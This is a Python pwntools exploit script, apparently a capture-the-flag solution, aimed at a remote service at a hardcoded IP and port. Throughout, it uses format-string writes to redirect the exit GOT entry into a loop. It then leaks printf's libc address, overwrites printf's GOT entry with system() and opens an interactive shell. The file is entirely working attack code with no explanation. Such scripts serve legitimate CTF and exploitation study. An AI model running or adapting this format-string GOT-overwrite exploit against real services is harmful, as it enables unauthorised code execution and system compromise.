#!/usr/bin/env python


from pwn import *

#io = process(["./console","logfile"])
#gdb.attach(io)
io=remote("34.206.4.227",55740)

exit_got_plt = 0x601258
printf_got_plt = 0x601220
printf_libc = 0x50cf0
system_libc = 0x41490

loop = 0x4009bd


# Infinite loop
addr_offset_printf = 28

last = 0
payload_inf_loop = "e "
for i in range(8):
    cnt = ((loop>>(i<<3))&0xff) - last
    if cnt <= 10:
        cnt += 256
    payload_inf_loop += "%1$" + str(cnt) + "u%" + str(addr_offset_printf+i) +"$n"
    last = ((loop>>(i<<3))&0xff) 

payload_inf_loop += "."*16

for i in range(8):
    payload_inf_loop += p64(exit_got_plt+i)


io.sendline(payload_inf_loop)
io.recvuntil("Exit message set!\n")

payload_get_libc = "e " + ".%15$s" + p64(printf_got_plt)
io.sendline(payload_get_libc)
io.recvuntil("Exit message set!\n")
data = io.recvuntil("Config action: ")[1:][:6]
printf = u64(data+"\x00"*(8-len(data)))
print "printf 0x%016x" % (printf)
libc = printf - printf_libc
print "libc 0x%016x" % (libc)
system = libc + system_libc
print "system 0x%016x" % (system)


#printf -> systme
addr_offset_printf = 28

last = 0
payload_system = "e "
for i in range(8):
    cnt = ((system>>(i<<3))&0xff) - last
    if cnt <= 10:
        cnt += 256
    payload_system += "%1$" + str(cnt) + "u%" + str(addr_offset_printf+i) +"$n"
    last = ((system>>(i<<3))&0xff)

payload_system += "."*16

for i in range(8):
    payload_system += p64(printf_got_plt+i)

io.sendline(payload_system)

io.interactive()
